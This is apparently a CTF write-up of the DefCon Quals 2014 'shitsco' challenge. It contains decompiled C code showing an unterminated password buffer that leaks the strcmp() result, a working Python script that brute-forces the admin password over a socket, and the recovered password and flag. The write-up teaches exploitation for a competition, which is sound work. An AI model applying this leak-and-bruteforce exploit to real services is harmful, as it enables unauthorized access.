---
layout: post
title: "DefCon Quals 2014 - shitsco"
date: 2014-05-23 14:10
comments: true
categories: reversing, bruteforce
author: stacks0n
---

## Analysis
We are basically provided with a Cisco IOS-like CLI:

```bash
stacks0n@ubuntu:/home/shitsco$ ~/Desktop/shitsco_c8b1aa31679e945ee64bde1bdb19d035 

 oooooooo8 oooo        o88    o8                                       
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo   
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888 
        888 888   888   888  888           888 888         888     888 
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88   
                                                                       
Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ ?
==========Available Commands==========
|enable                               |
|ping                                 |
|tracert                              |
|?                                    |
|shell                                |
|set                                  |
|show                                 |
|credits                              |
|quit                                 |
======================================
Type ? followed by a command for more detailed information
$ ? enable
enable: Enables administrator access, with the correct password.
$ enable cisco
Nope.  The password isn't cisco
$ enable
Please enter a password: cisco
Nope.  The password isn't ciscp�
```

After spending some time reversing and playing on the CLI, a few key points:

* in enable mode, you can run a command to print the flag (stored in file on disk)
* to get into enable mode you need to know the password (stored on disk and read into a global variable)
* there is a global boolean for whether you are in enable mode or not
* you can get a leak of the stack when you type 'enable' without a password and let it ask you. if you password is 5+ chars, you'll notice some data leaked

## Reversing
Notice in the following code, they do not null terminate the password. When the password is wrong, the printf will leak stack data. Fortunately for us, the result of the strcmp() will be leaked. That will allow us to brute force the password.

```c
int __cdecl do_enable(const char **a1)
{
  char *v1; // ebx@2
  char user_password[32]; // [sp+18h] [bp-34h]@2
  int bMatch; // [sp+38h] [bp-14h]@3
  int v5; // [sp+3Ch] [bp-10h]@1

  v5 = *MK_FP(__GS__, 0x14);
  if ( *a1 )
  {
    v1 = user_password;
    strncpy(user_password, *a1, 32u);
  }
  else
  {
    v1 = user_password;
    __printf_chk(1, "Please enter a password: ");
    fflush(stdout);
    get_password_from_user(0, (int)user_password, 32, '\n');
  }
  bMatch = strcmp(g_enable_password, v1);
  if ( bMatch )
  {
    __printf_chk(1, "Nope.  The password isn't %s\n", v1);
  }
  else
  {
    g_enable_mode = 1;
    g_prompt = '#';
    puts("Authentication Successful");
  }
  sub_8049090(a1);
  return *MK_FP(__GS__, 0x14) ^ v5;
}
```

```c
unsigned int __cdecl get_password_from_user(int fd, char *dest, int size, char delim)
{
  unsigned int count; // ebx@1
  char byte_read; // [sp+1Fh] [bp-1Dh]@3

  count = 0;
  if ( size > 0 )
  {
    while ( read(fd, &byte_read, 1u) > 0 )
    {
      if ( byte_read != delim )
      {
        dest[count++] = byte_read;
        if ( count != size )
          continue;
      }
      return count;
    }
    count = 0xFFFFFFFF;
  }
  return count;
}
```

## Code

The result of strcmp() will either be 1 or -1, depending on whether s1 or s2 is
bigger. By filling the buffer will '\x01', and guessing one character at a time
from high to low, we will be able to determine the actual character when the leaked data byte changes.
```python
#!/usr/bin/env python

import socket

def read_until(s, delim='$'):
  line = ""
  while True:
    b = s.recv(1)
    if b == delim:
      break
    line += b
  return line

def try_enable(s, password):
  guess = 128
  while guess > 0:
    s.send("enable\n")
    read_until(s, ':')
    s.send(password + chr(guess) + (31-len(password))*'\x01')
    # find the first transition in which our guess
    # is not higher than the target
    if read_until(s, '$')[-2] != '\xff':
      password += chr(guess)
      s.send("enable " + password + "\n")
      print repr(read_until(s, '$'))
      return password
    guess -= 1

s = socket.socket()
port = 31337
s.connect(('shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me', port))
done = False

# skip banner
read_until(s, '$')
password = ''
while True:
  password = try_enable(s, password)
  print password
s.close
```

## Solution
```bash
$ enable bruT3m3hard3rb4by
Authentication Successful
# ?
==========Available Commands==========
|enable                               |
|ping                                 |
|tracert                              |
|?                                    |
|flag                                 |
|shell                                |
|set                                  |
|show                                 |
|credits                              |
|quit                                 |
|disable                              |
======================================
Type ? followed by a command for more detailed information
# flag
The flag is: Dinosaur vaginas
```
